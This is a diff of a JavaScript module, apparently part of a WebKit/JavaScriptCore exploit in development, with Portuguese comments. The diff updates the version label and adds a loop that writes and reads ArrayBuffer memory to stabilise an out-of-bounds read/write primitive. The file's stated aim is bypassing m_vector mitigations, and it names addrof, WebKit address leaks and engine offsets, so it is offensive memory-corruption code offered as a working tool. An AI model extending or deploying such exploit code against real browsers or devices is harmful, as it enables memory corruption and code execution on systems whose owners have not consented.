@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v18 - Fortificando Alocacao OOB - Retenção de Referências)
+// js/script3/testArrayBufferVictimCrash.mjs (v19 - Fortificando Alocacao OOB - Aquecimento de Buffer)
 // =======================================================================================
 // ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
 // FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
@@ -22,7 +22,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v18 - Fortificando Alocacao OOB - Retencao de Referencias"; // Versão atualizada
+export const FNAME_MODULE = "v19 - Fortificando Alocacao OOB - Aquecimento de Buffer"; // Versão atualizada
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -357,6 +357,25 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const oob_array_buffer = oob_data_view.buffer; // Obtenha a referência ao ArrayBuffer real
         hold_objects.push(oob_array_buffer); // Mantenha o ArrayBuffer real referenciado para evitar GC
         hold_objects.push(oob_data_view); // Mantenha o DataView real referenciado para evitar GC
+
+        // NOVO: Aquecer/Pin o oob_array_buffer_real diretamente aqui
+        logFn(`[FASE 2] Aquecendo/Pinando oob_array_buffer_real para estabilizar ponteiro CONTENTS_IMPL_POINTER.`, "info");
+        try {
+            if (oob_array_buffer && oob_array_buffer.byteLength > 0) {
+                const tempUint8View = new Uint8Array(oob_array_buffer);
+                for (let i = 0; i < Math.min(1000, tempUint8View.length); i++) {
+                    tempUint8View[i] = i % 255; // Escreve para forçar atividade de memória
+                }
+                for (let i = 0; i < Math.min(1000, tempUint8View.length); i++) {
+                    let val = tempUint8View[i]; // Lê para forçar atividade de memória
+                }
+                logFn(`[FASE 2] oob_array_buffer_real aquecido/pinado com sucesso.`, "good");
+            }
+        } catch (e) {
+            logFn(`[FASE 2] ALERTA: Erro durante o aquecimento/pinning do oob_array_buffer_real: ${e.message}`, "warn");
+        }
+        // FIM do Aquecimento/Pinning
+
 
         if (!oob_data_view) {
             const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
